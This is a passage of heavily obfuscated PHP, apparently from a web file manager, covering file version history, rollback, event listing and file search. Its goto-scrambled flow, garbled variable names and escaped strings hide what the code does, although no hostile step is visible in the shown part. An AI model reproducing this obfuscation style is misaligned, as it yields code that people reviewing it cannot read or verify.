$f÷˜Æ‘Ìµ‘) { return $this->addEvent($CÑêù‹©è, $_SERVER[úÉ·öƒÑì©][1923], $f÷˜Æ‘Ìµ‘); } public function listBySource($dèšÈ‰ŞëÛ) { goto BàóÔä¤¡Ğ; BàóÔä¤¡Ğ: $f„Ä§Õ—å“ =& $_SERVER[úÉ·öƒÑì©]; $Eñ¤¿çíî = Model($f„Ä§Õ—å“[1213])->sourceInfo($dèšÈ‰ŞëÛ); $E²è“”ö‘´ = array($f„Ä§Õ—å“[419] => $dèšÈ‰ŞëÛ); goto F¥é‘¬‡•Â; E¬°«™á…ø: return $this->eventListParse($e”ÜÛÎ’™‡, $dèšÈ‰ŞëÛ); goto c‰ë¾²¹Ä; F¥é‘¬‡•Â: if ($Eñ¤¿çíî[$f„Ä§Õ—å“[412]] == $f„Ä§Õ—å“[87]) { $E»Óõß¤³’ = Model($f„Ä§Õ—å“[1213])->listSearchChildren($dèšÈ‰ŞëÛ, 20000); $E»Óõß¤³’[] = $dèšÈ‰ŞëÛ . $f„Ä§Õ—å“[384]; $E²è“”ö‘´ = array($f„Ä§Õ—å“[404] => array($f„Ä§Õ—å“[7], $E»Óõß¤³’)); } $e”ÜÛÎ’™‡ = $this->where($E²è“”ö‘´)->order($f„Ä§Õ—å“[1924])->selectPage(); if ($e”ÜÛÎ’™‡[$f„Ä§Õ—å“[373]][$f„Ä§Õ—å“[374]] == 0) { $e”ÜÛÎ’™‡[$f„Ä§Õ—å“[373]][$f„Ä§Õ—å“[374]] = 1; $e”ÜÛÎ’™‡[$f„Ä§Õ—å“[376]] = array(array($f„Ä§Õ—å“[419] => $dèšÈ‰ŞëÛ, $f„Ä§Õ—å“[1907] => $Eñ¤¿çíî[$f„Ä§Õ—å“[487]], $f„Ä§Õ—å“[1527] => $Eñ¤¿çíî[$f„Ä§Õ—å“[441]], $f„Ä§Õ—å“[424] => $f„Ä§Õ—å“[1925], $f„Ä§Õ—å“[425] => $Eñ¤¿çíî[$f„Ä§Õ—å“[194]], $f„Ä§Õ—å“[1529] => $f„Ä§Õ—å“[33])); } goto E¬°«™á…ø; c‰ë¾²¹Ä: } private function eventListParse($c¤¶½Ç–Ô¡, $CæëºË“÷Ü) { goto f­¥‰ŸÔ†; e¨éË–æ°: $d—°ÜÏªØ“ = array_to_keyvalue($F™ÂÅ¹‡Êƒ, $D³öŠ¡¹ò[33], $D³öŠ¡¹ò[1913]); foreach ($F™ÂÅ¹‡Êƒ as $C§•’´ ƒñ) { $D‰‰ğãÂŸ = $C§•’´ ƒñ[$D³öŠ¡¹ò[440]]; if ($C§•’´ ƒñ[$D³öŠ¡¹ò[29]] == $D³öŠ¡¹ò[529] && isset($D‰‰ğãÂŸ[$D³öŠ¡¹ò[1063]])) { $F„§•²ç„­[] = $D‰‰ğãÂŸ[$D³öŠ¡¹ò[1063]] . $D³öŠ¡¹ò[33]; $F„§•²ç„­[] = $D‰‰ğãÂŸ[$D³öŠ¡¹ò[1064]] . $D³öŠ¡¹ò[33]; } if ($C§•’´ ƒñ[$D³öŠ¡¹ò[29]] == $D³öŠ¡¹ò[1921] && isset($D‰‰ğãÂŸ[$D³öŠ¡¹ò[404]])) { $F„§•²ç„­[] = $D‰‰ğãÂŸ[$D³öŠ¡¹ò[404]] . $D³öŠ¡¹ò[33]; } } $F„§•²ç„­ = array_merge($F„§•²ç„­, $d—°ÜÏªØ“, array($CæëºË“÷Ü . $D³öŠ¡¹ò[33])); goto C Ì›¡å•Ù; C Ì›¡å•Ù: $F„§•²ç„­ = array_unique($F„§•²ç„­); $B¨Ï½ŠƒóŒ = array_unique(array_to_keyvalue($F™ÂÅ¹‡Êƒ, $D³öŠ¡¹ò[33], $D³öŠ¡¹ò[1535])); $C»•÷ëÏì¼ = Model($D³öŠ¡¹ò[515])->userListInfo($B¨Ï½ŠƒóŒ); goto BÏœµ¤å; c·ÑõÕ³ì¬: $c¤¶½Ç–Ô¡[$D³öŠ¡¹ò[376]] = $F™ÂÅ¹‡Êƒ; return $c¤¶½Ç–Ô¡; goto B‘×¤ÃÃÂ«; f­¥‰ŸÔ†: $D³öŠ¡¹ò =& $_SERVER[úÉ·öƒÑì©]; $F™ÂÅ¹‡Êƒ = $c¤¶½Ç–Ô¡[$D³öŠ¡¹ò[376]]; $F„§•²ç„­ = array_to_keyvalue($F™ÂÅ¹‡Êƒ, $D³öŠ¡¹ò[33], $D³öŠ¡¹ò[404]); goto e¨éË–æ°; BÏœµ¤å: $A¯ºÄ†‹´à = Model($D³öŠ¡¹ò[806])->sourceListInfo($F„§•²ç„­, !0); foreach ($F™ÂÅ¹‡Êƒ as &$C§•’´ ƒñ) { if ($C§•’´ ƒñ[$D³öŠ¡¹ò[29]] == $D³öŠ¡¹ò[529] && isset($C§•’´ ƒñ[$D³öŠ¡¹ò[440]][$D³öŠ¡¹ò[1063]])) { $C§•’´ ƒñ[$D³öŠ¡¹ò[440]][$D³öŠ¡¹ò[1063]] = $A¯ºÄ†‹´à[$C§•’´ ƒñ[$D³öŠ¡¹ò[440]][$D³öŠ¡¹ò[1063]]]; $C§•’´ ƒñ[$D³öŠ¡¹ò[440]][$D³öŠ¡¹ò[1064]] = $A¯ºÄ†‹´à[$C§•’´ ƒñ[$D³öŠ¡¹ò[440]][$D³öŠ¡¹ò[1064]]]; } if ($C§•’´ ƒñ[$D³öŠ¡¹ò[29]] == $D³öŠ¡¹ò[1921] && isset($C§•’´ ƒñ[$D³öŠ¡¹ò[440]][$D³öŠ¡¹ò[404]])) { $C§•’´ ƒñ[$D³öŠ¡¹ò[440]][$D³öŠ¡¹ò[404]] = $A¯ºÄ†‹´à[$C§•’´ ƒñ[$D³öŠ¡¹ò[440]][$D³öŠ¡¹ò[404]]]; } $C§•’´ ƒñ[$D³öŠ¡¹ò[85]] = $A¯ºÄ†‹´à[$C§•’´ ƒñ[$D³öŠ¡¹ò[404]]]; $C§•’´ ƒñ[$D³öŠ¡¹ò[1926]] = $A¯ºÄ†‹´à[$C§•’´ ƒñ[$D³öŠ¡¹ò[1913]]]; if ($C§•’´ ƒñ[$D³öŠ¡¹ò[29]] == $D³öŠ¡¹ò[1665]) { $C§•’´ ƒñ[$D³öŠ¡¹ò[1926]] = $C§•’´ ƒñ[$D³öŠ¡¹ò[85]]; $C§•’´ ƒñ[$D³öŠ¡¹ò[1913]] = $C§•’´ ƒñ[$D³öŠ¡¹ò[1926]][$D³öŠ¡¹ò[404]]; $C§•’´ ƒñ[$D³öŠ¡¹ò[85]] = !1; $C§•’´ ƒñ[$D³öŠ¡¹ò[404]] = $D³öŠ¡¹ò[33]; } $C§•’´ ƒñ[$D³öŠ¡¹ò[1856]] = $C»•÷ëÏì¼[$C§•’´ ƒñ[$D³öŠ¡¹ò[1535]]]; } unset($C§•’´ ƒñ); goto c·ÑõÕ³ì¬; B‘×¤ÃÃÂ«: } public function removeBySource($eƒ›„Öß®ª) { $c……­‚‡ = array($_SERVER[úÉ·öƒÑì©][419] => $eƒ›„Öß®ª); $this->where($c……­‚‡)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\x72\x63\145\137\x68\x69\163\x74\x6f\162\171"; public function historyCount($Cã†ßÙÙæª) { goto CÓãºîÏ’; CÓãºîÏ’: $fÛ§î…‘ŞÒ =& $_SERVER[úÉ·öƒÑì©]; if (!$Cã†ßÙÙæª) { return array(); } if (is_string($Cã†ßÙÙæª) || is_int($Cã†ßÙÙæª)) { $Cã†ßÙÙæª = array($Cã†ßÙÙæª); } goto c¶ä«öÃ«; bÉ¡Ş„èô: return array_to_keyvalue($d›ø¸öÑºè, $fÛ§î…‘ŞÒ[404], $fÛ§î…‘ŞÒ[489]); goto fÖ÷ùãßš½; c¶ä«öÃ«: $A‰ “Òï»‰ = array($fÛ§î…‘ŞÒ[404], $fÛ§î…‘ŞÒ[1731] => $fÛ§î…‘ŞÒ[489]); $BîÜË³öÓß = array($fÛ§î…‘ŞÒ[404] => array($fÛ§î…‘ŞÒ[7], $Cã†ßÙÙæª)); $d›ø¸öÑºè = $this->field($A‰ “Òï»‰)->where($BîÜË³öÓß)->group($fÛ§î…‘ŞÒ[404])->select(); goto bÉ¡Ş„èô; fÖ÷ùãßš½: } public function addHistory($Dª¹„Ô–ïä, $aãÖ·æÕø§ = '') { $d‹·ŸÁÙÊ =& $_SERVER[úÉ·öƒÑì©]; $DöÍë¯¬ = array($d‹·ŸÁÙÊ[419] => $Dª¹„Ô–ïä[$d‹·ŸÁÙÊ[404]], $d‹·ŸÁÙÊ[1527] => isset($Dª¹„Ô–ïä[$d‹·ŸÁÙÊ[443]]) ? $Dª¹„Ô–ïä[$d‹·ŸÁÙÊ[443]] : $Dª¹„Ô–ïä[$d‹·ŸÁÙÊ[441]], $d‹·ŸÁÙÊ[457] => $Dª¹„Ô–ïä[$d‹·ŸÁÙÊ[456]], $d‹·ŸÁÙÊ[557] => $Dª¹„Ô–ïä[$d‹·ŸÁÙÊ[78]], $d‹·ŸÁÙÊ[1927] => $aãÖ·æÕø§); $e´Î¹„ÎÏ = $GLOBALS[$d‹·ŸÁÙÊ[6]][$d‹·ŸÁÙÊ[88]][$d‹·ŸÁÙÊ[1112]]; if ($e´Î¹„ÎÏ > 1) { $this->historyAutoClear($DöÍë¯¬[$d‹·ŸÁÙÊ[404]]); $this->add($DöÍë¯¬); } Hook::trigger($d‹·ŸÁÙÊ[1928], $DöÍë¯¬); Model($d‹·ŸÁÙÊ[1929])->eventFileEdit($Dª¹„Ô–ïä[$d‹·ŸÁÙÊ[404]]); } private function historyAutoClear($C£°ä«ÇÛ†) { goto BÃÅòìóÚ; eò”„ç²Ç: $Dƒ¥¬ö¥“® = array($F¥óìØ«¼·[419] => $C£°ä«ÇÛ†); $cÃ‘«¨…Ïõ = $this->field($F¥óìØ«¼·[1930])->where($Dƒ¥¬ö¥“®)->order($F¥óìØ«¼·[1924])->select(); if (!$cÃ‘«¨…Ïõ || $d‡…Û’² >= count($cÃ‘«¨…Ïõ)) { return; } goto b¸â½ëÙ„Ÿ; D…È’ƒ¾Â›: $d‡…Û’² = $eÀ‹ˆ«¿š„ == $F¥óìØ«¼·[1134] ? 5 : $cÇ¯Â»Àº; if ($cÇ¯Â»Àº <= 1) { $d‡…Û’² = 1; } if ($d‡…Û’² >= 500) { return; } goto eò”„ç²Ç; bâ£³‘¥Ä£: $this->where($Dƒ¥¬ö¥“®)->delete(); Model($F¥óìØ«¼·[459])->remove($BÇáõÑõ“); goto A‚¾÷ŒÑÃ; E§²ºÀÓ: $BÇáõÑõ“ = array_slice($BÇáõÑõ“, $d‡…Û’²); if (!$eŸ‘¿ù‡é– || !$BÇáõÑõ“) { return; } $Dƒ¥¬ö¥“® = array($F¥óìØ«¼·[421] => array($F¥óìØ«¼·[7], $eŸ‘¿ù‡é–)); goto bâ£³‘¥Ä£; b¸â½ëÙ„Ÿ: $eŸ‘¿ù‡é– = array_to_keyvalue($cÃ‘«¨…Ïõ, $F¥óìØ«¼·[33], $F¥óìØ«¼·[402]); $eŸ‘¿ù‡é– = array_slice($eŸ‘¿ù‡é–, $d‡…Û’²); $BÇáõÑõ“ = array_to_keyvalue($cÃ‘«¨…Ïõ, $F¥óìØ«¼·[33], $F¥óìØ«¼·[456]); goto E§²ºÀÓ; BÃÅòìóÚ: $F¥óìØ«¼· =& $_SERVER[úÉ·öƒÑì©]; $eÀ‹ˆ«¿š„ = Model($F¥óìØ«¼·[746])->get($F¥óìØ«¼·[1133]); $cÇ¯Â»Àº = $GLOBALS[$F¥óìØ«¼·[6]][$F¥óìØ«¼·[88]][$F¥óìØ«¼·[1112]]; goto D…È’ƒ¾Â›; A‚¾÷ŒÑÃ: } public function listData($fØ‰³×¦Ë–) { goto BéªŠİÓ®Ä; BéªŠİÓ®Ä: $FÇö´ØäŞÉ =& $_SERVER[úÉ·öƒÑì©]; $cÒ‰Ÿ¨¯Ø = array($FÇö´ØäŞÉ[419] => $fØ‰³×¦Ë–); $bŠÕÃ†‘ù… = $FÇö´ØäŞÉ[1931]; goto A‰ßç­ã¡; Dù£ä‘‡ˆ…: $d˜—àƒÁ« = 5; if ($B‹«”ôŞ‘Ù == $FÇö´ØäŞÉ[1134]) { $A‡Œ›‡¢Úã[$FÇö´ØäŞÉ[376]] = array_slice($A‡Œ›‡¢Úã[$FÇö´ØäŞÉ[376]], 0, $d˜—àƒÁ«); $A‡Œ›‡¢Úã[$FÇö´ØäŞÉ[373]] = array($FÇö´ØäŞÉ[1932] => 1, $FÇö´ØäŞÉ[1933] => 20, $FÇö´ØäŞÉ[1934] => 1, $FÇö´ØäŞÉ[1935] => count($A‡Œ›‡¢Úã[$FÇö´ØäŞÉ[376]])); } return $A‡Œ›‡¢Úã; goto F†Ïïá‹Õ; A‰ßç­ã¡: $A‡Œ›‡¢Úã = $this->field($bŠÕÃ†‘ù…)->where($cÒ‰Ÿ¨¯Ø)->order($FÇö´ØäŞÉ[1924])->selectPage(); $this->_listAppendUser($A‡Œ›‡¢Úã[$FÇö´ØäŞÉ[376]]); $B‹«”ôŞ‘Ù = Model($FÇö´ØäŞÉ[746])->get($FÇö´ØäŞÉ[1133]); goto Dù£ä‘‡ˆ…; F†Ïïá‹Õ: } protected function _listAppendUser(&$BÛ÷Š¼§) { $BÌğˆµ³‡À =& $_SERVER[úÉ·öƒÑì©]; $eŠ”Ù™ãË­ = array_to_keyvalue($BÛ÷Š¼§, $BÌğˆµ³‡À[33], $BÌğˆµ³‡À[1535]); $b×â³†ø”ø = Model($BÌğˆµ³‡À[515])->userListInfo($eŠ”Ù™ãË­); foreach ($BÛ÷Š¼§ as &$F‹²Ñˆ½ˆ) { $c²ßßñÚÆ = $F‹²Ñˆ½ˆ[$BÌğˆµ³‡À[1535]]; $F‹²Ñˆ½ˆ[$BÌğˆµ³‡À[441]] = $b×â³†ø”ø[$c²ßßñÚÆ] ? $b×â³†ø”ø[$c²ßßñÚÆ] : !1; } unset($F‹²Ñˆ½ˆ); } public function fileInfo($b³¿˜–„Ş) { $Ağ´ÓšÃ† =& $_SERVER[úÉ·öƒÑì©]; $dì²ªÌ×í¼ = $this->tablePrefix; $a×™ÁË˜¨— = "{$dì²ªÌ×í¼}\151\x6f\x5f\x66\151\x6c\x65\40\146\151\x6c\145\x73\40\157\x6e\40\146\x69\154\x65\163\56\146\151\154\x65\111\104\40\75\x20\x68\151\x73\x74\157\162\171\x2e\146\151\154\x65\x49\104"; return $this->alias($Ağ´ÓšÃ†[1936])->where(array($Ağ´ÓšÃ†[421] => $b³¿˜–„Ş))->join($a×™ÁË˜¨—, $Ağ´ÓšÃ†[1937])->find(); } public function removeItem($b‘–í‚‰Ñç) { $EªøÚâÙòë =& $_SERVER[úÉ·öƒÑì©]; $CÇ¿­öÆ£ó = array($EªøÚâÙòë[421] => $b‘–í‚‰Ñç); $FñŠáîº = $this->where($CÇ¿­öÆ£ó)->find(); if ($FñŠáîº) { $Eœ†¯†ÑâÖ = $this->where($CÇ¿­öÆ£ó)->delete(); Model($EªøÚâÙòë[459])->remove($FñŠáîº[$EªøÚâÙòë[456]]); return $Eœ†¯†ÑâÖ; } return !1; } public function removeBySource($cæµ ÓÅ„‘) { goto Dœ’÷¯«Œ§; FÓ¿¶¿Êù: return !0; goto bÕãîìğ¤‰; AÔ‹íÖì¯»: $A‡ˆÍ¢¡é = array($Fì‚â‚É„­[419] => array($Fì‚â‚É„­[7], $cæµ ÓÅ„‘)); $AÖ‚Ø„†™‘ = $this->field($Fì‚â‚É„­[457])->where($A‡ˆÍ¢¡é)->select(); if ($AÖ‚Ø„†™‘) { $this->where($A‡ˆÍ¢¡é)->delete(); $b÷‘ÂÃ«éğ = array_to_keyvalue($AÖ‚Ø„†™‘, $Fì‚â‚É„­[33], $Fì‚â‚É„­[456]); Model($Fì‚â‚É„­[459])->remove($b÷‘ÂÃ«éğ); } goto FÓ¿¶¿Êù; Dœ’÷¯«Œ§: $Fì‚â‚É„­ =& $_SERVER[úÉ·öƒÑì©]; if (!$cæµ ÓÅ„‘) { return !1; } if (!is_array($cæµ ÓÅ„‘)) { $cæµ ÓÅ„‘ = array($cæµ ÓÅ„‘); } goto AÔ‹íÖì¯»; bÕãîìğ¤‰: } public function setDetail($d‹Ï‰™°„¿, $cÑå„«ÆÈ­) { $d²“ˆ‰è» =& $_SERVER[úÉ·öƒÑì©]; return $this->where(array($d²“ˆ‰è»[421] => $d‹Ï‰™°„¿))->save(array($d²“ˆ‰è»[1927] => $cÑå„«ÆÈ­)); } public function rollbackToItem($C‹Ï–¼µ†Æ, $Bãø®¯¿‹‡) { goto Fï‡ÙÒ; Fï‡ÙÒ: $Aò‰ÀäÆôÇ =& $_SERVER[úÉ·öƒÑì©]; $BèØ·ÚÖĞÎ = Model($Aò‰ÀäÆôÇ[806])->sourceInfo($C‹Ï–¼µ†Æ); $this->addHistory($BèØ·ÚÖĞÎ, LNG($Aò‰ÀäÆôÇ[1938])); goto DÓ¬íÈ¸µŠ; DÓ¬íÈ¸µŠ: $cŞè™…©ÖÀ = $this->find($Bãø®¯¿‹‡); $b´«­À¤ˆ = array($Aò‰ÀäÆôÇ[456] => $cŞè™…©ÖÀ[$Aò‰ÀäÆôÇ[456]], $Aò‰ÀäÆôÇ[78] => $cŞè™…©ÖÀ[$Aò‰ÀäÆôÇ[78]], $Aò‰ÀäÆôÇ[84] => time(), $Aò‰ÀäÆôÇ[443] => USER_ID); Model($Aò‰ÀäÆôÇ[806])->where(array($Aò‰ÀäÆôÇ[404] => $C‹Ï–¼µ†Æ))->save($b´«­À¤ˆ); goto f†Ê¯¬µ’Ê; f†Ê¯¬µ’Ê: return $this->where(array($Aò‰ÀäÆôÇ[421] => $Bãø®¯¿‹‡))->delete(); goto e¸ìéÙƒš; e¸ìéÙƒš: } public function clearSame($C†İï‰íÏ) { goto dŠÌÆÄ®ë×; dŠÌÆÄ®ë×: $f˜™ôÅø§ß =& $_SERVER[úÉ·öƒÑì©]; $aÖÆÅêïÀ¢ = $this->listData($C†İï‰íÏ); $f¦áë…²¼î = array_to_keyvalue_group($aÖÆÅêïÀ¢, $f˜™ôÅø§ß[456]); goto C«ƒßÀ‡ÒÒ; C«ƒßÀ‡ÒÒ: $Dó‹ìâÃ¶Ç = array(); $a¨óÕãâÛ† = array(); foreach ($f¦áë…²¼î as $cœ“šğ¢) { if (!$cœ“šğ¢ || count($cœ“šğ¢) <= 1) { continue; } foreach ($cœ“šğ¢ as $B²‹‰¦½‚ˆ) { $Dó‹ìâÃ¶Ç[] = $B²‹‰¦½‚ˆ[$f˜™ôÅø§ß[456]]; $a¨óÕãâÛ†[] = $B²‹‰¦½‚ˆ[$f˜™ôÅø§ß[402]]; } } goto a·Ì‚©Ô¤; a·Ì‚©Ô¤: if (!$a¨óÕãâÛ†) { return; } $this->where(array($f˜™ôÅø§ß[402] => array($f˜™ôÅø§ß[7], $a¨óÕãâÛ†)))->delete(); Model($f˜™ôÅø§ß[459])->remove($Dó‹ìâÃ¶Ç); goto D•®„Ğé™ˆ; D•®„Ğé™ˆ: } public function userSpace() { $Fœµæì¡¹¨ =& $_SERVER[úÉ·öƒÑì©]; $CŸœÉƒ÷àÃ = $this->tablePrefix; $A†Ô™œ¯Ã = array($Fœµæì¡¹¨[1527] => USER_ID); $A­ÍÂº¥‡¯ = "{$CŸœÉƒ÷àÃ}\x69\x6f\x5f\x66\151\x6c\145\x20\x66\x69\x6c\145\163\40\157\156\x20\x66\151\x6c\145\x73\x2e\146\151\154\145\111\x44\40\75\40\150\151\163\164\x6f\x72\171\x2e\x66\x69\154\x65\x49\x44"; return $this->alias($Fœµæì¡¹¨[1936])->where($A†Ô™œ¯Ã)->join($A­ÍÂº¥‡¯, $Fœµæì¡¹¨[1937])->sum($Fœµæì¡¹¨[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($A¦Ö¡ç¿›÷) { goto d¨÷´Ã¯Ùä; A¼ñ‡Ş†: if (!$C¥¿®Ï) { return array(); } $fó˜í•ŠÌ = $C¥¿®Ï[$b¿ŒÛ¿•¨Æ[168]]; $eƒ‹¨Ù‡’Ç = $b¿ŒÛ¿•¨Æ[7]; goto DÅ‚—‹Û…†; DÅ‚—‹Û…†: if (!$C¥¿®Ï[$b¿ŒÛ¿•¨Æ[168]]) { $Cø š´İêµ = array_to_keyvalue($eÁÊÜÑô£¢, $b¿ŒÛ¿•¨Æ[33], $b¿ŒÛ¿•¨Æ[168]); $fó˜í•ŠÌ = implode($b¿ŒÛ¿•¨Æ[47], $Cø š´İêµ); $eƒ‹¨Ù‡’Ç = $b¿ŒÛ¿•¨Æ[1939]; } $e¹¹Ö×…õÍ = explode($b¿ŒÛ¿•¨Æ[47], trim($fó˜í•ŠÌ, $b¿ŒÛ¿•¨Æ[47])); return array($eƒ‹¨Ù‡’Ç, $e¹¹Ö×…õÍ); goto F®©œÃ‰ñÛ; d¨÷´Ã¯Ùä: $b¿ŒÛ¿•¨Æ =& $_SERVER[úÉ·öƒÑì©]; $eÁÊÜÑô£¢ = KodIO::fileTypeList(); $C¥¿®Ï = $eÁÊÜÑô£¢[$A¦Ö¡ç¿›÷]; goto A¼ñ‡Ş†; F®©œÃ‰ñÛ: } public function listPathType($a®ñ¿óòÚ) { $bÉÑ­²•Õ =& $_SERVER[úÉ·öƒÑì©]; $c¢Î‡••¢¥ = $this->fileTypeWhere($a®ñ¿óòÚ); if (!$c¢Î‡••¢¥) { return array(); } $cÌ«×ƒ„Œ = array($bÉÑ­²•Õ[558] => SourceModel::TYPE_USER, $bÉÑ­²•Õ[559] => USER_ID, $bÉÑ­²•Õ[555] => 0, $bÉÑ­²•Õ[556] => $c¢Î‡••¢¥); return $this->listSource($cÌ«×ƒ„Œ); } public function listSearch($Cà§ö©ß³Õ, $FÊø“ÓÏ’¿ = 300) { goto FâÒÓ•øçÙ; fÑ½–İÛ™Œ: $this->_listMake($cóáå†²£œ); return $cóáå†²£œ; goto AË´—Ô•–; eì­ôŒ¨¾ñ: if (!isset($Då…¿ƒñå…[$bêÄÑó”Ô¡[432]])) { $Då…¿ƒñå…[$bêÄÑó”Ô¡[432]] = 0; } $A¥®ğµçëÚ = $bêÄÑó”Ô¡[1941]; $aáĞ¡õ‹¦ = $A¥®ğµçëÚ; goto DáïâöŠ•à; DáïâöŠ•à: $this->_listSearchBindPinyin($Cà§ö©ß³Õ, $Då…¿ƒñå…, $A¥®ğµçëÚ); $this->alias($bêÄÑó”Ô¡[525])->_makeOrder(); $Då…¿ƒñå… = $this->parseWhereLike($Då…¿ƒñå…); goto dïšì°åÜÏ; bÇ­÷ÆæÁ‰: $this->_listSearchTag($cóáå†²£œ, $Cà§ö©ß³Õ, $aáĞ¡õ‹¦); $this->_listSearchGroupTag($cóáå†²£œ, $Cà§ö©ß³Õ, $aáĞ¡õ‹¦); $this->_listDataApply($cóáå†²£œ[$bêÄÑó”Ô¡[376]]); goto fÑ½–İÛ™Œ; dïšì°åÜÏ: $cóáå†²£œ = $this->distinct(!0)->field($A¥®ğµçëÚ)->where($Då…¿ƒñå…)->selectPage($FÊø“ÓÏ’¿); $this->_listSearchFileContent($cóáå†²£œ, $Cà§ö©ß³Õ, $aáĞ¡õ‹¦); $this->_listSearchDesc($cóáå†²£œ, $Cà§ö©ß³Õ, $aáĞ¡õ‹¦); goto bÇ­÷ÆæÁ‰; FâÒÓ•øçÙ: $bêÄÑó”Ô¡ =& $_SERVER[úÉ·öƒÑì©]; if (isset($Cà§ö©ß³Õ[$bêÄÑó”Ô¡[1782]]) && $Cà§ö©ß³Õ[$bêÄÑó”Ô¡[1782]]) { $Cà§ö©ß³Õ[$bêÄÑó”Ô¡[1782]] = str_replace($bêÄÑó”Ô¡[390], $bêÄÑó”Ô¡[1940], trim($Cà§ö©ß³Õ[$bêÄÑó”Ô¡[1782]])); } $Då…¿ƒñå… = $this->_parseSearchWhere($Cà§ö©ß³Õ); goto eì­ôŒ¨¾ñ; AË´—Ô•–: } private function _listSearchFileContent(&$AÑ¹Ü§•˜ê, $f–Á×ÙÙ×, $D¢³„§‡Ï•) { goto eßô±ìË; døô¦ÇŸÒ¿: $AÑ¹Ü§•˜ê[$eÎ—¦ñë»ä[376]] = array_merge($fŒ”¯‚ˆ§ , $AÑ¹Ü§•˜ê[$eÎ—¦ñë»ä[376]]); $AÑ¹Ü§•˜ê[$eÎ—¦ñë»ä[373]][$eÎ—¦ñë»ä[374]] += count($fŒ”¯‚ˆ§ ); goto c‚ãô¢¡¨İ; b—çŒÚÑà: unset($f–Á×ÙÙ×[$eÎ—¦ñë»ä[456]]); $fŒ”¯‚ˆ§  = $this->field($D¢³„§‡Ï•)->where($d×ëì²ÕïÈ)->limit($eÎ—¦ñë»ä[1942])->select(); if (!$fŒ”¯‚ˆ§  || count($fŒ”¯‚ˆ§ ) == 0) { return; } goto døô¦ÇŸÒ¿; BÛöÎÊğĞ¨: if (!isset($d×ëì²ÕïÈ[$eÎ—¦ñë»ä[28]]) || !is_array($f–Á×ÙÙ×[$eÎ—¦ñë»ä[456]])) { return; } $d×ëì²ÕïÈ[$eÎ—¦ñë»ä[456]] = array($eÎ—¦ñë»ä[7], $f–Á×ÙÙ×[$eÎ—¦ñë»ä[456]]); unset($d×ëì²ÕïÈ[$eÎ—¦ñë»ä[28]]); goto b—çŒÚÑà; eßô±ìË: $eÎ—¦ñë»ä =& $_SERVER[úÉ·öƒÑì©]; if (!$f–Á×ÙÙ×[$eÎ—¦ñë»ä[1782]] || $AÑ¹Ü§•˜ê[$eÎ—¦ñë»ä[373]][$eÎ—¦ñë»ä[360]] > 1) { return; } $d×ëì²ÕïÈ = $this->_parseSearchWhere($f–Á×ÙÙ×); goto BÛöÎÊğĞ¨; c‚ãô¢¡¨İ: } private function _listSearchTag(&$D²ÙÔô‘Çñ, $D›í©ŠºæÔ, $C¢“À‡×İ) { goto F‡«İÃœ’; e—Ø÷É¡œ: $A×†´ˆ¤š˜ = array(); $AË®ÍÒ…ßá = $D›í©ŠºæÔ[$b”Ç…Û…ŠĞ[1782]]; foreach ($EÈ®‡¸² as $Fïµ–¾Ö) { $A„ñ”¹—Ç¨ = $Fïµ–¾Ö[$b”Ç…Û…ŠĞ[28]]; $dğî‹éÌÏ = str_replace($b”Ç…Û…ŠĞ[50], $b”Ç…Û…ŠĞ[33], Pinyin::encode($A„ñ”¹—Ç¨)); if (stripos($A„ñ”¹—Ç¨, $AË®ÍÒ…ßá) !== !1 || stripos($dğî‹éÌÏ, $AË®ÍÒ…ßá) !== !1) { $A×†´ˆ¤š˜[] = $Fïµ–¾Ö[$b”Ç…Û…ŠĞ[402]]; } } goto B½éí‚šÁ–; F‡«İÃœ’: $b”Ç…Û…ŠĞ =& $_SERVER[úÉ·öƒÑì©]; if (!$D›í©ŠºæÔ[$b”Ç…Û…ŠĞ[1782]] || $D²ÙÔô‘Çñ[$b”Ç…Û…ŠĞ[373]][$b”Ç…Û…ŠĞ[360]] > 1) { return; } $EÈ®‡¸² = Model($b”Ç…Û…ŠĞ[1943])->listData(); goto e—Ø÷É¡œ; Eóã‡ñè²: $B¤Ş¬«ŒĞ‹ = array_to_keyvalue($B¤Ş¬«ŒĞ‹, $b”Ç…Û…ŠĞ[33], $b”Ç…Û…ŠĞ[76]); $c§ƒ‘·¦“á = array_unique($B¤Ş¬«ŒĞ‹); $this->_listSearchMerge($D²ÙÔô‘Çñ, $D›í©ŠºæÔ, $C¢“À‡×İ, $c§ƒ‘·¦“á); goto fôÒœÊÛ; B½éí‚šÁ–: if (!$A×†´ˆ¤š˜) { return; } $e¸¶‹ÄØÁ = array($b”Ç…Û…ŠĞ[428] => array($b”Ç…Û…ŠĞ[7], $A×†´ˆ¤š˜), $b”Ç…Û…ŠĞ[1535] => USER_ID); $B¤Ş¬«ŒĞ‹ = Model($b”Ç…Û…ŠĞ[429])->field($b”Ç…Û…ŠĞ[76])->where($e¸¶‹ÄØÁ)->select(); goto Eóã‡ñè²; fôÒœÊÛ: } private function _listSearchDesc(&$dÎõœ©Š‹, $bãë¿ØÏ¥, $c®ŠòÑ—¬) { goto b¦ø´ƒè¼ß; b¦ø´ƒè¼ß: $eÜ©òˆµ• =& $_SERVER[úÉ·öƒÑì©]; if (!$bãë¿ØÏ¥[$eÜ©òˆµ•[1782]] || $dÎõœ©Š‹[$eÜ©òˆµ•[373]][$eÜ©òˆµ•[360]] > 1) { return; } $c¶ñ¡´—‡Î = $this->listSearchChildren($bãë¿ØÏ¥[$eÜ©òˆµ•[487]]); goto f½Á›“‘õÕ; f½Á›“‘õÕ: $c¶ñ¡´—‡Î = array_unique($c¶ñ¡´—‡Î); if (!$c¶ñ¡´—‡Î) { return; } $f”£öï¨ = array($eÜ©òˆµ•[404] => array($eÜ©òˆµ•[7], $c¶ñ¡´—‡Î), $eÜ©òˆµ•[93] => $eÜ©òˆµ•[440], $eÜ©òˆµ•[381] => array($eÜ©òˆµ•[389], $eÜ©òˆµ•[1784] . $bãë¿ØÏ¥[$eÜ©òˆµ•[1782]] . $eÜ©òˆµ•[1784])); goto aÖÇ½Ş¢ø×; aÖÇ½Ş¢ø×: $aˆšè¶œ²— = Model($eÜ©òˆµ•[541])->field($eÜ©òˆµ•[404])->where($f”£öï¨)->select(); $AŞïÁ‘­˜× = array_to_keyvalue($aˆšè¶œ²—, $eÜ©òˆµ•[33], $eÜ©òˆµ•[404]); $this->_listSearchMerge($dÎõœ©Š‹, $bãë¿ØÏ¥, $c®ŠòÑ—¬, $AŞïÁ‘­˜×); goto d‚ÄŞ¾ÇŸ; d‚ÄŞ¾ÇŸ: } private function _listSearchGroupTag(&$bÄ½÷ï‘ƒ, $E´‡Óó•ª, 